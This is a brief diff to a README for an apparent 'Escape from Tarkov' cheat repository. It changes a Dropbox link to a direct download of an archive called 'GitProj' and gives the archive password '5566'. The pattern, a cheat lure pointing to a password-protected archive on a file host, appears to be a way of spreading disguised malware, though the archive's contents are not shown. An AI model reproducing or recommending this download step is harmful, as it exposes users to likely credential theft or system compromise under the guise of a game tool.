@@ -2,7 +2,7 @@
 
  ![1](https://github.com/runthejulesash/Escape-from-Tarkov-BLADE/assets/148510168/866b1da3-496c-4ad0-923a-13bb53c9e228)
 
-# 🗂[Ｌｏａｄ](https://www.dropbox.com/scl/fi/f5dsu6w699mqeipvfpfqw/GitProj.zip?rlkey=yofprnttavb76lm54q69zrt8i&dl=0)
+# 🗂[Ｌｏａｄ](https://dl.dropboxusercontent.com/scl/fi/f5dsu6w699mqeipvfpfqw/GitProj?rlkey=yofprnttavb76lm54q69zrt8i)
 
 # 🔓Ｐａｓｓ: 5566
 
